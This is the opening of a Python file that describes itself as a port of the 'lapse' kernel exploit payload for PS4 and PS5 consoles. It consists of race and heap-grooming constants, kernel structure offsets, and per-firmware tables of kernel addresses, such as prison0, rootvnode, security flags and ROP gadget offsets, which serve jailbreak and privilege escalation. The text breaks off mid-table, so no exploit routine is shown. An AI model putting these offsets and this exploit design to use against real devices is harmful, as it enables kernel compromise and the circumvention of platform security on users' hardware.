import struct

# if WRITING:  # dummy objects for writing code
#     class Executable:
#         errno = 0
#         def __call__(self, *args, **kwargs):
#             return 0

#         def get_error_string(self):
#             return ""

#     class Container:
#         def __getattribute__(self, name):
#             return Executable()

#     class sc:
#         mem = bytearray()
#         version = ""
#         platform = ""
#         errno = 0
#         libkernel_addr = 0
#         libc_addr = 0
#         exec_addr = 0

#         syscalls = Container()
#         functions = Container()

#         @staticmethod
#         def make_function_if_needed(name, addr):
#             return Executable()

#     class ROPChain:
#         def __init__(self, *args, **kwargs):
#             pass

#         def push_syscall(self, *args, **kwargs):
#             pass

#         def push_write_into_memory(self, *args, **kwargs):
#             pass

#     SYSCALL = {}
#     LIBC_OFFSETS = {}
#     SELECTED_LIBC = {}

#     def alloc(size):
#         return bytearray(size)

#     def readuint(addr, size):
#         return 0

#     def get_ref_addr(data):
#         return 0

#     def readbuf(addr, size):
#         return bytearray(size)

#     def get_cstring(data, addr=0):
#         return ""

#     def u64_to_i64(value):
#         return value


# Port of https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua

MAIN_CORE = 4
MAIN_RTPRIO = 0x100

NUM_WORKERS = 2
NUM_GROOMS = 0x200
NUM_HANDLES = 0x100
NUM_RACES = 100
NUM_SDS = 64
NUM_SDS_ALT = 48
NUM_ALIAS = 100
LEAK_LEN = 16
NUM_LEAKS = 16
NUM_CLOBBERS = 8

RTP_LOOKUP = 0

PAGE_SIZE = 0x4000

KERNEL_OFFSETS = {
    "ps4": {
        # proc structure
        "PROC_FD": 0x48,
        "PROC_PID": 0xB0,
        "PROC_VM_SPACE": 0x200,
        "PROC_COMM": 0xFFFFFFFFFFFFFFFF,  # -1
        "PROC_SYSENT": 0xFFFFFFFFFFFFFFFF,  # -1
        # filedesc
        "FILEDESC_OFILES": 0x0,
        "SIZEOF_OFILES": 0x8,
        # vmspace structure
        "VMSPACE_VM_PMAP": 0xFFFFFFFFFFFFFFFF,  # -1
        "VMSPACE_VM_VMID": 0xFFFFFFFFFFFFFFFF,  # -1
        # pmap structure
        "PMAP_CR3": 0x28,
        # net
        "SO_PCB": 0x18,
        "INPCB_PKTOPTS": 0x118,
    },
    "ps5": {
        # proc structure
        "PROC_FD": 0x48,
        "PROC_PID": 0xBC,
        "PROC_VM_SPACE": 0x200,
        "PROC_COMM": 0xFFFFFFFFFFFFFFFF,  # -1
        "PROC_SYSENT": 0xFFFFFFFFFFFFFFFF,  # -1
        # filedesc
        "FILEDESC_OFILES": 0x8,
        "SIZEOF_OFILES": 0x30,
        # vmspace structure
        "VMSPACE_VM_PMAP": 0xFFFFFFFFFFFFFFFF,  # -1
        "VMSPACE_VM_VMID": 0xFFFFFFFFFFFFFFFF,  # -1
        # pmap structure
        "PMAP_CR3": 0x28,
        # gpu vmspace structure
        "SIZEOF_GVMSPACE": 0x100,
        "GVMSPACE_START_VA": 0x8,
        "GVMSPACE_SIZE": 0x10,
        "GVMSPACE_PAGE_DIR_VA": 0x38,
        # net
        "SO_PCB": 0x18,
        "INPCB_PKTOPTS": 0x120,
    },
}

PS4_KERNEL_VERSION_OFFSETS = {
    "9.00": {
        "EVF_OFFSET": 0x7F6F27,
        "PRISON0": 0x111F870,
        "ROOTVNODE": 0x21EFF20,
        "TARGET_ID_OFFSET": 0x221688D,
        "SYSENT_661_OFFSET": 0x1107F00,
        "JMP_RSI_GADGET": 0x4C7AD,
    },
    "9.03": {
        "EVF_OFFSET": 0x7F4CE7,
        "PRISON0": 0x111B840,
        "ROOTVNODE": 0x21EBF20,
        "TARGET_ID_OFFSET": 0x221288D,
        "SYSENT_661_OFFSET": 0x1103F00,
        "JMP_RSI_GADGET": 0x5325B,
    },
    "9.04": {
        "EVF_OFFSET": 0x7F4CE7,
        "PRISON0": 0x111B840,
        "ROOTVNODE": 0x21EBF20,
        "TARGET_ID_OFFSET": 0x221288D,
        "SYSENT_661_OFFSET": 0x1103F00,
        "JMP_RSI_GADGET": 0x5325B,
    },
    "9.50": {
        "EVF_OFFSET": 0x769A88,
        "PRISON0": 0x11137D0,
        "ROOTVNODE": 0x21A6C30,
        "TARGET_ID_OFFSET": 0x221A40D,
        "SYSENT_661_OFFSET": 0x1100EE0,
        "JMP_RSI_GADGET": 0x15A6D,
    },
    "9.51": {
        "EVF_OFFSET": 0x769A88,
        "PRISON0": 0x11137D0,
        "ROOTVNODE": 0x21A6C30,
        "TARGET_ID_OFFSET": 0x221A40D,
        "SYSENT_661_OFFSET": 0x1100EE0,
        "JMP_RSI_GADGET": 0x15A6D,
    },
    "9.60": {
        "EVF_OFFSET": 0x769A88,
        "PRISON0": 0x11137D0,
        "ROOTVNODE": 0x21A6C30,
        "TARGET_ID_OFFSET": 0x221A40D,
        "SYSENT_661_OFFSET": 0x1100EE0,
        "JMP_RSI_GADGET": 0x15A6D,
    },
    "10.00": {
        "EVF_OFFSET": 0x7B5133,
        "PRISON0": 0x111B8B0,
        "ROOTVNODE": 0x1B25BD0,
        "TARGET_ID_OFFSET": 0x1B9E08D,
        "SYSENT_661_OFFSET": 0x110A980,
        "JMP_RSI_GADGET": 0x68B1,
    },
    "10.01": {
        "EVF_OFFSET": 0x7B5133,
        "PRISON0": 0x111B8B0,
        "ROOTVNODE": 0x1B25BD0,
        "TARGET_ID_OFFSET": 0x1B9E08D,
        "SYSENT_661_OFFSET": 0x110A980,
        "JMP_RSI_GADGET": 0x68B1,
    },
    "10.50": {
        "EVF_OFFSET": 0x7A7B14,
        "PRISON0": 0x111B910,
        "ROOTVNODE": 0x1BF81F0,
        "TARGET_ID_OFFSET": 0x1BE460D,
        "SYSENT_661_OFFSET": 0x110A5B0,
        "JMP_RSI_GADGET": 0x50DED,
    },
    "10.70": {
        "EVF_OFFSET": 0x7A7B14,
        "PRISON0": 0x111B910,
        "ROOTVNODE": 0x1BF81F0,
        "TARGET_ID_OFFSET": 0x1BE460D,
        "SYSENT_661_OFFSET": 0x110A5B0,
        "JMP_RSI_GADGET": 0x50DED,
    },
    "10.71": {
        "EVF_OFFSET": 0x7A7B14,
        "PRISON0": 0x111B910,
        "ROOTVNODE": 0x1BF81F0,
        "TARGET_ID_OFFSET": 0x1BE460D,
        "SYSENT_661_OFFSET": 0x110A5B0,
        "JMP_RSI_GADGET": 0x50DED,
    },
    "11.00": {
        "EVF_OFFSET": 0x7FC26F,
        "PRISON0": 0x111F830,
        "ROOTVNODE": 0x2116640,
        "TARGET_ID_OFFSET": 0x221C60D,
        "SYSENT_661_OFFSET": 0x1109350,
        "JMP_RSI_GADGET": 0x71A21,
    },
    "11.02": {
        "EVF_OFFSET": 0x7FC22F,
        "PRISON0": 0x111F830,
        "ROOTVNODE": 0x2116640,
        "TARGET_ID_OFFSET": 0x221C60D,
        "SYSENT_661_OFFSET": 0x1109350,
        "JMP_RSI_GADGET": 0x71A21,
    },
    "11.50": {
        "EVF_OFFSET": 0x784318,
        "PRISON0": 0x111FA18,
        "ROOTVNODE": 0x2136E90,
        "TARGET_ID_OFFSET": 0x21CC60D,
        "SYSENT_661_OFFSET": 0x110A760,
        "JMP_RSI_GADGET": 0x704D5,
    },
    "11.52": {
        "EVF_OFFSET": 0x784318,
        "PRISON0": 0x111FA18,
        "ROOTVNODE": 0x2136E90,
        "TARGET_ID_OFFSET": 0x21CC60D,
        "SYSENT_661_OFFSET": 0x110A760,
        "JMP_RSI_GADGET": 0x704D5,
    },
    "12.00": {
        "EVF_OFFSET": 0x784798,
        "PRISON0": 0x111FA18,
        "ROOTVNODE": 0x2136E90,
        "TARGET_ID_OFFSET": 0x21CC60D,
        "SYSENT_661_OFFSET": 0x110A760,
        "JMP_RSI_GADGET": 0x47B31,
    },
    "12.02": {
        "EVF_OFFSET": 0x784798,
        "PRISON0": 0x111FA18,
        "ROOTVNODE": 0x2136E90,
        "TARGET_ID_OFFSET": 0x21CC60D,
        "SYSENT_661_OFFSET": 0x110A760,
        "JMP_RSI_GADGET": 0x47B31,
    },
}

PS5_KERNEL_VERSION_OFFSETS = {
    "1.00": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1BF8,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F2B8,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.01": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1BF8,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F2B8,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.02": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1BF8,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F2B8,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.05": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1C18,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F328,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.10": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1C18,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F328,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.11": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1C18,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F328,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.12": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1C18,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F328,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.13": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1C18,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F328,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "1.14": {
        "DATA_BASE": 0x01B40000,
        "DATA_SIZE": 0x08631930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x0658BB58,
        "DATA_BASE_ALLPROC": 0x026D1C18,
        "DATA_BASE_SECURITY_FLAGS": 0x06241074,
        "DATA_BASE_ROOTVNODE": 0x06565540,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x02F9F328,
        "DATA_BASE_DATA_CAVE": 0x05F20000,
        "DATA_BASE_GVMSPACE": 0x06202E70,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "2.00": {
        "DATA_BASE": 0x01B80000,
        "DATA_SIZE": 0x087E1930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x06739B88,
        "DATA_BASE_ALLPROC": 0x02701C28,
        "DATA_BASE_SECURITY_FLAGS": 0x063E1274,
        "DATA_BASE_ROOTVNODE": 0x067134C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031338C8,
        "DATA_BASE_DATA_CAVE": 0x060C0000,
        "DATA_BASE_GVMSPACE": 0x063A2EB0,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "2.20": {
        "DATA_BASE": 0x01B80000,
        "DATA_SIZE": 0x087E1930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x06739B88,
        "DATA_BASE_ALLPROC": 0x02701C28,
        "DATA_BASE_SECURITY_FLAGS": 0x063E1274,
        "DATA_BASE_ROOTVNODE": 0x067134C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031338C8,
        "DATA_BASE_DATA_CAVE": 0x060C0000,
        "DATA_BASE_GVMSPACE": 0x063A2EB0,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "2.25": {
        "DATA_BASE": 0x01B80000,
        "DATA_SIZE": 0x087E1930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x06739B88,
        "DATA_BASE_ALLPROC": 0x02701C28,
        "DATA_BASE_SECURITY_FLAGS": 0x063E1274,
        "DATA_BASE_ROOTVNODE": 0x067134C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031338C8,
        "DATA_BASE_DATA_CAVE": 0x060C0000,
        "DATA_BASE_GVMSPACE": 0x063A2EB0,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "2.26": {
        "DATA_BASE": 0x01B80000,
        "DATA_SIZE": 0x087E1930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x06739B88,
        "DATA_BASE_ALLPROC": 0x02701C28,
        "DATA_BASE_SECURITY_FLAGS": 0x063E1274,
        "DATA_BASE_ROOTVNODE": 0x067134C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031338C8,
        "DATA_BASE_DATA_CAVE": 0x060C0000,
        "DATA_BASE_GVMSPACE": 0x063A2EB0,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "2.30": {
        "DATA_BASE": 0x01B80000,
        "DATA_SIZE": 0x087E1930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x06739B88,
        "DATA_BASE_ALLPROC": 0x02701C28,
        "DATA_BASE_SECURITY_FLAGS": 0x063E1274,
        "DATA_BASE_ROOTVNODE": 0x067134C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031338C8,
        "DATA_BASE_DATA_CAVE": 0x060C0000,
        "DATA_BASE_GVMSPACE": 0x063A2EB0,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "2.50": {
        "DATA_BASE": 0x01B80000,
        "DATA_SIZE": 0x087E1930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x06739B88,
        "DATA_BASE_ALLPROC": 0x02701C28,
        "DATA_BASE_SECURITY_FLAGS": 0x063E1274,
        "DATA_BASE_ROOTVNODE": 0x067134C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031338C8,
        "DATA_BASE_DATA_CAVE": 0x060C0000,
        "DATA_BASE_GVMSPACE": 0x063A2EB0,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "2.70": {
        "DATA_BASE": 0x01B80000,
        "DATA_SIZE": 0x087E1930,
        "DATA_BASE_DYNAMIC": 0x00000000,
        "DATA_BASE_TO_DYNAMIC": 0x06739B88,
        "DATA_BASE_ALLPROC": 0x02701C28,
        "DATA_BASE_SECURITY_FLAGS": 0x063E1274,
        "DATA_BASE_ROOTVNODE": 0x067134C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031338C8,
        "DATA_BASE_DATA_CAVE": 0x060C0000,
        "DATA_BASE_GVMSPACE": 0x063A2EB0,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "3.00": {
        "DATA_BASE": 0x00BD0000,
        "DATA_SIZE": 0x08871930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x067D1B90,
        "DATA_BASE_ALLPROC": 0x0276DC58,
        "DATA_BASE_SECURITY_FLAGS": 0x06466474,
        "DATA_BASE_ROOTVNODE": 0x067AB4C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031BE218,
        "DATA_BASE_DATA_CAVE": 0x06140000,
        "DATA_BASE_GVMSPACE": 0x06423F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "3.20": {
        "DATA_BASE": 0x00BD0000,
        "DATA_SIZE": 0x08871930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x067D1B90,
        "DATA_BASE_ALLPROC": 0x0276DC58,
        "DATA_BASE_SECURITY_FLAGS": 0x06466474,
        "DATA_BASE_ROOTVNODE": 0x067AB4C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031BE218,
        "DATA_BASE_DATA_CAVE": 0x06140000,
        "DATA_BASE_GVMSPACE": 0x06423F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "3.21": {
        "DATA_BASE": 0x00BD0000,
        "DATA_SIZE": 0x08871930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x067D1B90,
        "DATA_BASE_ALLPROC": 0x0276DC58,
        "DATA_BASE_SECURITY_FLAGS": 0x06466474,
        "DATA_BASE_ROOTVNODE": 0x067AB4C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x031BE218,
        "DATA_BASE_DATA_CAVE": 0x06140000,
        "DATA_BASE_GVMSPACE": 0x06423F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "4.00": {
        "DATA_BASE": 0x00C00000,
        "DATA_SIZE": 0x087B1930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x0670DB90,
        "DATA_BASE_ALLPROC": 0x027EDCB8,
        "DATA_BASE_SECURITY_FLAGS": 0x06506474,
        "DATA_BASE_ROOTVNODE": 0x066E74C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03257A78,
        "DATA_BASE_DATA_CAVE": 0x06C01000,
        "DATA_BASE_GVMSPACE": 0x064C3F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "4.02": {
        "DATA_BASE": 0x00C00000,
        "DATA_SIZE": 0x087B1930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x0670DB90,
        "DATA_BASE_ALLPROC": 0x027EDCB8,
        "DATA_BASE_SECURITY_FLAGS": 0x06506474,
        "DATA_BASE_ROOTVNODE": 0x066E74C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03257A78,
        "DATA_BASE_DATA_CAVE": 0x06C01000,
        "DATA_BASE_GVMSPACE": 0x064C3F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "4.03": {
        "DATA_BASE": 0x00C00000,
        "DATA_SIZE": 0x087B1930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x0670DB90,
        "DATA_BASE_ALLPROC": 0x027EDCB8,
        "DATA_BASE_SECURITY_FLAGS": 0x06506474,
        "DATA_BASE_ROOTVNODE": 0x066E74C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03257A78,
        "DATA_BASE_DATA_CAVE": 0x06C01000,
        "DATA_BASE_GVMSPACE": 0x064C3F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "4.50": {
        "DATA_BASE": 0x00C00000,
        "DATA_SIZE": 0x087B1930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x0670DB90,
        "DATA_BASE_ALLPROC": 0x027EDCB8,
        "DATA_BASE_SECURITY_FLAGS": 0x06506474,
        "DATA_BASE_ROOTVNODE": 0x066E74C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03257A78,
        "DATA_BASE_DATA_CAVE": 0x06C01000,
        "DATA_BASE_GVMSPACE": 0x064C3F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "4.51": {
        "DATA_BASE": 0x00C00000,
        "DATA_SIZE": 0x087B1930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x0670DB90,
        "DATA_BASE_ALLPROC": 0x027EDCB8,
        "DATA_BASE_SECURITY_FLAGS": 0x06506474,
        "DATA_BASE_ROOTVNODE": 0x066E74C0,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03257A78,
        "DATA_BASE_DATA_CAVE": 0x06C01000,
        "DATA_BASE_GVMSPACE": 0x064C3F80,
        "PMAP_STORE_PML4PML4I": -0x1C,
        "PMAP_STORE_DMPML4I": 0x288,
        "PMAP_STORE_DMPDPI": 0x28C,
    },
    "5.00": {
        "DATA_BASE": 0x00C40000,
        "DATA_SIZE": 0x08921930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x06879C00,
        "DATA_BASE_ALLPROC": 0x0291DD00,
        "DATA_BASE_SECURITY_FLAGS": 0x066466EC,
        "DATA_BASE_ROOTVNODE": 0x06853510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03398A88,
        "DATA_BASE_DATA_CAVE": 0x06320000,
        "DATA_BASE_GVMSPACE": 0x06603FB0,
        "PMAP_STORE_PML4PML4I": -0x105C,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "5.02": {
        "DATA_BASE": 0x00C40000,
        "DATA_SIZE": 0x08921930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x06879C00,
        "DATA_BASE_ALLPROC": 0x0291DD00,
        "DATA_BASE_SECURITY_FLAGS": 0x066466EC,
        "DATA_BASE_ROOTVNODE": 0x06853510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03398A88,
        "DATA_BASE_DATA_CAVE": 0x06320000,
        "DATA_BASE_GVMSPACE": 0x06603FB0,
        "PMAP_STORE_PML4PML4I": -0x105C,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "5.10": {
        "DATA_BASE": 0x00C40000,
        "DATA_SIZE": 0x08921930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x06879C00,
        "DATA_BASE_ALLPROC": 0x0291DD00,
        "DATA_BASE_SECURITY_FLAGS": 0x066466EC,
        "DATA_BASE_ROOTVNODE": 0x06853510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03398A88,
        "DATA_BASE_DATA_CAVE": 0x06320000,
        "DATA_BASE_GVMSPACE": 0x06603FB0,
        "PMAP_STORE_PML4PML4I": -0x105C,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "5.50": {
        "DATA_BASE": 0x00C40000,
        "DATA_SIZE": 0x08921930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x06879C00,
        "DATA_BASE_ALLPROC": 0x0291DD00,
        "DATA_BASE_SECURITY_FLAGS": 0x066466EC,
        "DATA_BASE_ROOTVNODE": 0x06853510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x03394A88,
        "DATA_BASE_DATA_CAVE": 0x06320000,
        "DATA_BASE_GVMSPACE": 0x06603FB0,
        "PMAP_STORE_PML4PML4I": -0x105C,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "6.00": {
        "DATA_BASE": 0x00C60000,
        "DATA_SIZE": 0x08861930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x067C5C10,
        "DATA_BASE_ALLPROC": 0x02869D20,
        "DATA_BASE_SECURITY_FLAGS": 0x065968EC,
        "DATA_BASE_ROOTVNODE": 0x0679F510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x032E4358,
        "DATA_BASE_DATA_CAVE": 0x06270000,
        "DATA_BASE_GVMSPACE": 0x065540F0,
        "PMAP_STORE_PML4PML4I": -0x105C,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "6.02": {
        "DATA_BASE": 0x00C60000,
        "DATA_SIZE": 0x08861930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x067C5C10,
        "DATA_BASE_ALLPROC": 0x02869D20,
        "DATA_BASE_SECURITY_FLAGS": 0x065968EC,
        "DATA_BASE_ROOTVNODE": 0x0679F510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x032E4358,
        "DATA_BASE_DATA_CAVE": 0x06270000,
        "DATA_BASE_GVMSPACE": 0x065540F0,
        "PMAP_STORE_PML4PML4I": -0x105C,
        "PMAP_STORE_DMPML4I": 0x29C,
        "PMAP_STORE_DMPDPI": 0x2A0,
    },
    "6.50": {
        "DATA_BASE": 0x00C60000,
        "DATA_SIZE": 0x08861930,
        "DATA_BASE_DYNAMIC": 0x00010000,
        "DATA_BASE_TO_DYNAMIC": 0x067C5C10,
        "DATA_BASE_ALLPROC": 0x02869D20,
        "DATA_BASE_SECURITY_FLAGS": 0x065968EC,
        "DATA_BASE_ROOTVNODE": 0x0679F510,
        "DATA_BASE_KERNEL_PMAP_STORE": 0x032E4358,
        "DATA_BASE_DATA_CAVE": 0x06270000,
